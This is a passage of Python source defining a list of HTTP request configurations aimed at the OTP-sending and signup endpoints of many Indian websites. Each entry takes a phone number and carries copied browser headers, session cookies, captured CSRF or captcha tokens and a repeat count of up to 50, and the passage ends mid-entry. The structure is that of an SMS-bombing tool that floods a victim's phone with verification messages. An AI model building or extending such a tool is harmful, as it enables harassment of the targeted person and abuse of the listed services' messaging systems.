            "cookie": "vt_home_visited=Yes; IS_YAHOO_NATIVE=False; landing_page_url=\"https://www.coverfox.com/\"; tracker=6f8b6312ab8e3039ed01a0c5dae0fd73; sessionid=xtymjyfi87nat0xp09g1qx0xrms9cu9l; _ga_M60LBYV2SK=GS1.1.1715591814.1.0.1715591814.0.0.0; _gid=GA1.2.190999011.1715591815; _gat_gtag_UA_236899531_1=1; _dc_gtm_UA-45524191-1=1; _ga=GA1.1.1812460515.1715591815; _ga_L1DCK356RJ=GS1.1.1715591815.1.0.1715591815.0.0.0; AWSALB=6d3J4OZjP7N26858oPfNJvxuA5e3ePcOVmaoC9PO/iRqTj3NW3qhAozavPMDSCULtHgwKjUjMmxQgqjFpUsHnDB9PYDrC8DP9V+EfrFfNsLKVTndTrLIZpCou0zd; _uetsid=8c899110110911efbeba7dac0ce54265; _uetvid=8c8aa560110911ef9e9c35a1a2c7d25c; _fbp=fb.1.1715591818489.212380246",
            "origin": "https://www.coverfox.com",
            "priority": "u=1, i",
            "referer": "https://www.coverfox.com/user-login/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact={phone}",
        "count": 5
    },
    
    {
        "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "PHPSESSID=g2toohfnh12nevqm9ugvai7vb2; utm_campaign_id=1406; source=Google; skip_mobile=true; _gcl_aw=GCL.1715593865.EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE; _gcl_au=1.1.645456708.1715593865; _gid=GA1.2.2020750747.1715593866; _gac_UA-62640150-1=1.1715593866.EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE; _uetsid=515109b0110e11ef924e1f3875a02587; _uetvid=515ae710110e11ef8666217de75f3cf9; _ga=GA1.1.358917175.1715593866; _fbp=fb.1.1715593868299.1718531847; login_modal_shown=yes; G_ENABLED_IDPS=google; _ga_WYJWZGFQ0J=GS1.1.1715593867.1.0.1715593882.45.0.0; modal_shown=yes",
            "origin": "https://www.woodenstreet.com",
            "priority": "u=1, i",
            "referer": "https://www.woodenstreet.com/?utm_source=Google&utm_medium=cpc&utm_campaign=14220867988&cid=EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE&pl=&kw=wooden%20street&utm_adgroup=125331114403&gad_source=1&gclid=EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "token": "",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"token=&firstname=Aartd&telephone={phone}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&cxid=NTUxOTE0&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj&pagesource=onload&redirect2=&login=2&userput_otp=",
        "count": 5
    },
    
    {
        "url": "https://gomechanic.app/api/v2/send_otp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://gomechanic.in",
            "Referer": "https://gomechanic.in/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"number": phone, "source": "website", "random_id": "K6z9b"}),
        "count": 50
    },
    
    {
        "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en",
            "client-code": "vulpix",
            "content-type": "application/json",
            "origin": "https://www.lovelocal.in",
            "priority": "u=1, i",
            "referer": "https://www.lovelocal.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A/Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "role": "CUSTOMER"}),
        "count": 50
    },
    
    {
        "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "PHPSESSID=t2p0nhdq0lr9urakmratq4nd1o; _gcl_au=1.1.1418022926.1715621870; _gid=GA1.2.1238691204.1715621871; _gat_UA-144475494-1=1; gads=ID=f63744b23745a70c:T=1715621871:RT=1715621871:S=ALNI_MZBf13VT4bNVBfKOHbiZhJ3r9u5yA; gpi=UID=00000e1a8fc4f354:T=1715621871:RT=1715621871:S=ALNI_MYs8bPQMcoLAM5g-TX_h9lYl29HMA; __eoi=ID=8128f50e3278b1a5:T=1715621871:RT=1715621871:S=AA-AfjYrJcEbaBWGnMYqCRZith_o; dyn_cookie=true; v_type_id=3; _ga=GA1.2.110565510.1715621871; utm_source=Direct; firstUTMParamter=Direct#null#null; lastUTMParamter=Direct#null#null; landing_url=https://www.tyreplex.com/login; la_abbr=LOGIN; la_abbr_d=Login Page; la_c=login; la_default_city_id=1630; la_default_pincode=110001; la_default_pincode_display=110001, New Delhi; la_load_more_after_records=8; la_ajax_load_more_records=8; la_match_v_variants=; pv_abbr=LOGIN; pv_abbr_d=Login Page; pv_c=login; pv_default_city_id=1630; pv_default_pincode=110001; pv_default_pincode_display=110001, New Delhi; pv_load_more_after_records=8; pv_ajax_load_more_records=8; pv_match_v_variants=; _fbp=fb.1.1715621882325.2109963301; _ga_K6EJPW0E8D=GS1.1.1715621871.1.1.1715621890.41.0.0; city_id=1630; default_city_id=1630; pincode=110086; manual_city_selected=1",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
        "count": 1
    },
    
    {
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "source=website; nxt=eyJjaXBoZXJ0ZXh0IjoiNmtJWEowNHA0VnRLQ3Faa0NudDBOR2R2SVpLWllmV3RSWkVpMW9DUFkxcz0iLCJpdiI6IjI3NmU4MmJiNGViMTYzN2JiNzdlMWE0NWJlODlmNmUyIiwic2FsdCI6ImIxOWQ3N2I3MzdjMDI0ODg1NjI1ZDUwOTVmZjg5M2ZjYzQyOGZjZTFjMGEzYzc0MjRmNmJiNGFjY2Q3MDJhMTAwNzNiNTIyYTU5MGFmNWJkN2ZjNTYxZTIxOGI4MzgzZDk5NTJiNzRjNGM1ZGU0NGY4ZDM3YzhmOWYyYmRmMzBiM2JhYWFlZTY3YjEwY2U3MjM3MGQ0ZThhZTkzMmMxMTlhZTM5ZGI3MzViZGEwMjgwMzY3NzlkYzllMzI0MDljYmNmOWNhYzA1NmVlNjI0NWQ5NDU2ZDIwMWEyOWYwMjNjNDI4MGI0MjBhYjY4YmNkZGY0YzJjYjQ4YmQ1ZGUwMzYwNzQwOTRhNmYxMTI5NWI1ZDU3MDM5ZWQyZmZhMTQ0ZjFmYTBiOGQ1ZTE1OTQ4ZjYxYTA0OWQ5NjllYTc1ZDY5MmU3MWIyMmRlZDhiOGVlMThlYzU0MDY1NmY2ZjE4ODY1MmY5YWQ1OGMxYjFmMjk4MDNlODg2YjZkOWY0OTIwYjUzOGMwOTY5YTM4MGFjMjQzZjMxNGQzYjM1ZTg1MWI3MDRiYTI0MjI4ZDM1YzE4ODE5YTZmYjliYzA4NTkwMWY3MGUxM2ZjMmJkYTk4Njc2ZGI3OWEzNmFjNDc4ZGE1YzdhYTA2MWJlMmFiOTJhNTYxYmU2ZTA5NDQ2MmI5NjQwIiwiaXRlcmF0aW9ucyI6OTk5fQ==; _gid=GA1.2.1985917922.1715943256; _gcl_au=1.1.1244050996.1715943259; _gat=1; _ga_YN0TX18PEE=GS1.1.1715943268.1.0.1715943268.0.0.0; _ga=GA1.1.972140952.1715943256; WZRK_G=fd462bffc0674ad3bdf9f6b7c537c6c7; WZRK_S_445-488-5W5Z=%7B%22p%22%3A1%2C%22s%22%3A1715943284%2C%22t%22%3A1715943283%7D",
            "origin": "https://www.licious.in",
            "priority": "u=1, i",
            "referer": "https://www.licious.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "serverside": "false",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "x-csrf-token": ""
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 3
    },
    
    {
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "WZRK_G=466bfb3ffeed42af94539ddb75aab1a3; WZRK_S_8RK-99W-485Z=%7B%22p%22%3A1%2C%22s%22%3A1716292040%2C%22t%22%3A1716292041%7D; _ga=GA1.2.470062265.1716292041; _gid=GA1.2.307457907.1716292041; _gat_UA-96384581-2=1; _fbp=fb.1.1716292041396.1682971378; _uetsid=e4457600176711efbd4505b1c7173542; _uetvid=e445bdd0176711efbe4db167d99f3d78; _ga_4S93MBNNX8=GS1.2.1716292043.1.0.1716292052.51.0.0; _ga_F7R96SWGCB=GS1.1.1716292040.1.1.1716292052.0.0.0",
            "origin": "https://www.gopaysense.com",
            "priority": "u=1, i",
            "referer": "https://www.gopaysense.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 10
    },
    
    {
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "access-control-allow-methods": "GET, POST, PUT, DELETE",
            "content-type": "application/json",
            "cookie": "AMCVS_1CEE09F45D761AFF0A495E2D%40AdobeOrg=1; AMCV_1CEE09F45D761AFF0A495E2D%40AdobeOrg=179643557%7CMCIDTS%7C19865%7CMCMID%7C58822726746254564151447357050729602323%7CMCAAMLH-1716898290%7C12%7CMCAAMB-1716898290%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1716300690s%7CNONE%7CvVersion%7C5.5.0; s_cc=true; user_sid=s%3ATQ0qv4hLT153wuEftXkOFpeoaD4f3RcC.Pf2awi603%2BgCd0vFyqddzywhbtBrgq77GVj9pyt7DLA; _gcl_aw=GCL.1716293504.EAIaIQobChMIqN7yuduehgMVXCSDAx3VPw8_EAAYASAAEgLhQPD_BwE; AMP_TOKEN=%24NOT_FOUND; _gid=GA1.2.1283593062.1716293508; _gat_UA-65947081-1=1; _ga_V1GYNRLK0T=GS1.1.1716293509.1.0.1716293509.60.0.0; _fbp=fb.1.1716293510686.1114094958; _ga=GA1.2.1383706961.1716293508; _gac_UA-65947081-1=1.1716293517.EAIaIQobChMIqN7yuduehgMVXCSDAx3VPw8_EAAYASAAEgLhQPD_BwE; _gcl_au=1.1.1857621863.1716293504.492344148.1716293509.1716293517; gpv_V9=moglix%3Asignup%20form; s_nr=1716293519104-New; s_sq=%5B%5BB%5D%5D",
            "origin": "https://www.moglix.com",
            "priority": "u=1, i",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"email": "", "phone": phone, "type": "p", "source": "signup", "buildVersion": "DESKTOP-7.3", "device": "desktop"}),
        "count": 7
    },
    
    {
        "url": "https://oxygendigitalshop.com/graphql",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "PHPSESSID=kpqtnpvmdp4k43tcgdopos8e88; _gcl_au=1.1.309357057.1716293827; _clck=1gmll5w%7C2%7Cfly%7C0%7C1602; _ga=GA1.2.1318673831.1716293828; _gid=GA1.2.1588528699.1716293829; _gat_UA-179241331-1=1; _fbp=fb.1.1716293829956.1718674954; private_content_version=09b3c0c64a967be3c44ffa5b45edc234; _ga_M4N3E3FN0Z=GS1.1.1716293827.1.1.1716293856.31.0.0; _clsk=c5rolk%7C1716293857454%7C4%7C1%7Ci.clarity.ms%2Fcollect",
            "origin": "https://oxygendigitalshop.com",
            "priority": "u=1, i",
            "referer": "https://oxygendigitalshop.com/my-account",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"operationName": "sendRegistrationOtp", "variables": {"email_or_otp": f"+91{phone}", "isResend": False, "token": "03AFcWeA47pl14PFJtz3PaIyTLlRVG0gBdqirpf5kuLCM3Ue63bo30D5xtt3OngezeoBlB3kVH6x8AtyIRK-K6_WOXHx4W4bGNY4803bh8kpzibb2hUbjPTE780Kr1Gh7fVuZvTtsS-osUhhLAWsc3H8Fp3JFnFQi3u4gtZ_ARIQtzAUWp9p8Qt4nDsrM2fwtX9uC0SYz78n1EEXoIstjuEedvgPGsC7xqnwWBwySpW2tAGvVYIQzk6uloXuCUM9CLogsdYPt5_8G437Em9CO-I1SmQCyniCF0UDzfYGUl8pzIBSbWLzZdj4DvFkVHOHytFd6UvjqjTyuoT2RQI-KKXI9wJDGXwtbQOakjRLKE-SymDCD0k6GPQvjNJcbqhk-NMVckwSHLP3muLKQRI9EBKB4t3IjTCHoVyPMF0eLg4J5raYeukU0b0rwoOCoDs7_5uyLCc8qzIBh6LHywWirQJ-m1HvNyfsOvBX-d8_bWT7MIPKFflQfd_DnZKDyrFrRRMVQKiXeSVIRhEAZDIJul5f7Ns-t5isfYOU8-dcANSC1VJeMSPZBkXtKKvSXXYM9vtc7V59nhPyv7LU5v_wpZ2KwOHj7dybDeVr2ELZARDI1tc_NMxZy9HMrLuGhscKa1kSy29v0tpBqtU-l7vIB-1qLT-G3kxHJE4fdv9TL973FPzbEpz03wusN5YomS0hv31VhRPr-qDHBzmj-O1gyPxlEhPkNSPuiPwg"}, "query": "mutation sendRegistrationOtp($token: String!, $email_or_otp: String!, $isResend: Boolean!) {\n  sendRegistrationOtp(token: $token, value: $email_or_otp, is_resend: $isResend)\n}\n"}),
        "count": 7
    },
    
    {
        "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "client": "web",
            "content-type": "application/json",
            "course": "general-interest",
            "origin": "https://www.upgrad.com",
            "priority": "u=1, i",
            "referer": "https://www.upgrad.com/",
            "referrer": "https://www.google.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "utm_campaign": "IND_ACQ_WEB_Google_BSearch_All_All_All_Brand_ROI",
            "utm_content": "Brand_Longtail",
            "utm_medium": "BSearch",
            "utm_source": "Google",
            "utm_term": "upgrad online education"
        },
        "data": lambda phone: json.dumps({"phoneNumber": f"+91{phone}"}),
        "count": 10
    },
    
    {
        "url": "http://www.pinknblu.com/v1/auth/generate/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "laravel_session=eyJpdiI6IlBkMkhkZnN3NWpmSE9vQ3Q2VUlyTXc9PSIsInZhbHVlIjoiWHZQTE1HYmhyUTljcWk1NVhyN3hUUkZvYituYzVHclA5NHZ4RHlvaEJNcnNIdENIUmJ6RVNnbjU2bEh5YUE4VVExRzZnRjArK01ZWm4yRmFmZGtobXY0aUw2ZEVaVk1takZKSSt1OW8wcGt6NmZKT1hcL3FlaTd1WjhaemNKXC9tQSIsIm1hYyI6ImRiNTViNjJhZjRjNTE4MWFjMTE4OGYxNWU3M2ExZTAyM2Q3OGVhYTY1NjVhNGY0ZWI3MDQ5YmVjM2M1MGNiYTAifQ%3D%3D; _ga=GA1.1.173966415.1716892374; _gcl_au=1.1.1212519590.1716892374; _fbp=fb.1.1716892385789.994456642; _ga_S6S2RJNH92=GS1.1.1716892373.1.1.1716892425.0.0.0; _ga_8B7LH5VE3Z=GS1.1.1716892374.1.1.1716892425.0.0.0",
            "Origin": "http://www.pinknblu.com",
            "Referer": "http://www.pinknblu.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"_token=HvvCsMqCY6poDB4GYPd2DJxewZ6H6TWPMHt8hfEV&country_code=%2B91&phone={phone}",
        "count": 50
    },
    
    {
        "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-IN",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "cookie": "_gid=GA1.2.390459560.1717491496; sid=OF6ijMUYe94BAJPF2m5KGXveYuKyBSVwv+8eUiBFoetQsOwBEf29e+ZR5RacCERPDWwsGifGpzmIdknNx7TaCkm4; mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18fa628beb42fc6-0b4da1b51d2b74-26001c51-100200-18fa628beb42fc6%22%2C%22%24device_id%22%3A%20%2218fa628beb42fc6-0b4da1b51d2b74-26001c51-100200-18fa628beb42fc6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22mps%22%3A%20%7B%7D%2C%22mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D%2C%22mpus%22%3A%20%7B%7D%2C%22mpa%22%3A%20%7B%7D%2C%22mpu%22%3A%20%7B%7D%2C%22mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; _gat_gtag_UA_180706540_1=1; WZRK_S_8R9-67W-W75Z=%7B%22p%22%3A1%7D; _ga_VDVX6P049R=GS1.1.1717491507.1.0.1717491507.0.0.0; _ga=GA1.1.393162471.1716479639",
            "origin": "https://auth.udaan.com",
            "priority": "u=1, i",
            "referer": "https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "traceparent": "00-db9fd114c85d50d740faf1697fafe008-10128c0be7778059-00",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "x-app-id": "udaan-auth"
        },
        "data": lambda phone: f"mobile={phone}",
        "count": 3
    },
    
    {
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "client-version": "300",
            "Authorization": "Bearer",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.xylem.live/",
            "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4",
            "client-id": "64254d66be2a390018e6d348",
            "client-type": "WEB",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "firstName": "Anant Ambani"}),
        "count": 50
    },
    
    {
        "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=5631cb3b0d6c45f7bbe6cad72d259956",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "cloudfront-viewer-address=60.243.56.169%3A50469; cloudfront-viewer-country=IN; cloudfront-viewer-latitude=12.89960; cloudfront-viewer-longitude=80.22090; headerFalse=false; isMobile=false; deviceType=web; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; _fbp=fb.1.1717523419577.584874862107093753; __zlcmid=1M6mlnN1oPHJHpz; _gcl_au=1.1.1317100846.1717523446; moe_uuid=066d95a8-7171-4415-bb99-8c3208dd358a; _gid=GA1.2.1017913527.1717523447; _gat_UA-46762303-1=1; nbDevice=desktop; mbTrackID=f80f8a7ed66e49bd94ecb36eb4ec1231; JSESSION=a00e843f-c089-4974-bf93-187b368b5fd6; _ga=GA1.2.1392560530.1717523447; _ga_BS11V183V6=GS1.1.1717523448.1.0.1717523449.0.0.0; SPRING_SECURITY_REMEMBER_ME_COOKIE=RE5nY1B6emFITDNROURiK3Q3bGUxZz09OmVhNHhhMmFtdGtYK3lCU0d3VVZFelE9PQ; nbccc=ce1dab2af6f44009bd5b52e763f82eb6; loggedInUserStatus=new; _f_au=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczovL2lkZW50aXR5dG9vbGtpdC5nb29nbGVhcGlzLmNvbS9nb29nbGUuaWRlbnRpdHkuaWRlbnRpdHl0b29sa2l0LnYxLklkZW50aXR5VG9vbGtpdCIsImV4cCI6MTcxNzUyNzA5NSwiaWF0IjoxNzE3NTIzNDk1LCJpc3MiOiJub2Jyb2tlci1maXJlYmFzZUBuby1icm9rZXIuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCJzdWIiOiJub2Jyb2tlci1maXJlYmFzZUBuby1icm9rZXIuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCJ1aWQiOiI4YTlmODVjMzhmZTQzNWFhMDE4ZmU0NjBiYWUwMGE1NCJ9.MrM3GFgrPEXnRagMOJDt6qUWkJDGts7uqpGV_o9fp9GHhyxYEnfwglMuc_tjA0wUFi79z376sLUIhVB8RsFHmueWEkxFRhaWcHXpj0CoiwYrKfY-h1PlxxwK6CiqFj0KXlcF21y_bulFwdBGtJzRY4vsYIdDpZI5eIv9wZip2e1i8aQXrHrcQNaZBcnI8a9kyelHeaSsQrkLKcX1ujan-beemsh4H0InDVLTGlYgXKgnQZlN5Ee5eZjlASbwYu7UdkHhanQN9XSJNqPyG2P7gGuN3Ma8z3_WXcslVcAzO0kJqozOAg3eyuqkPVttvliYZf4Hw5as-NbtXDI6mqvZ2A; _ud_check=true; _ud_basic=true; _ud_login=true; _ga_SQ9H8YK20V=GS1.1.1717523447.1.1.1717523496.11.0.502991464",
            "origin": "https://www.nobroker.in",
            "priority": "u=1, i",
            "referer": "https://www.nobroker.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sentry-trace": "5631cb3b0d6c45f7bbe6cad72d259956-8b4734b3007bc507",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"phone=%2B91{phone}",
        "count": 50
    },
    
    {
        "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "PHPSESSID=t2p0nhdq0lr9urakmratq4nd1o; _gcl_au=1.1.1418022926.1715621870; _gid=GA1.2.1238691204.1715621871; _gat_UA-144475494-1=1; gads=ID=f63744b23745a70c:T=1715621871:RT=1715621871:S=ALNI_MZBf13VT4bNVBfKOHbiZhJ3r9u5yA; gpi=UID=00000e1a8fc4f354:T=1715621871:RT=1715621871:S=ALNI_MYs8bPQMcoLAM5g-TX_h9lYl29HMA; __eoi=ID=8128f50e3278b1a5:T=1715621871:RT=1715621871:S=AA-AfjYrJcEbaBWGnMYqCRZith_o; dyn_cookie=true; v_type_id=3; _ga=GA1.2.110565510.1715621871; utm_source=Direct; firstUTMParamter=Direct#null#null; lastUTMParamter=Direct#null#null; landing_url=https://www.tyreplex.com/login; la_abbr=LOGIN; la_abbr_d=Login Page; la_c=login; la_default_city_id=1630; la_default_pincode=110001; la_default_pincode_display=110001, New Delhi; la_load_more_after_records=8; la_ajax_load_more_records=8; la_match_v_variants=; 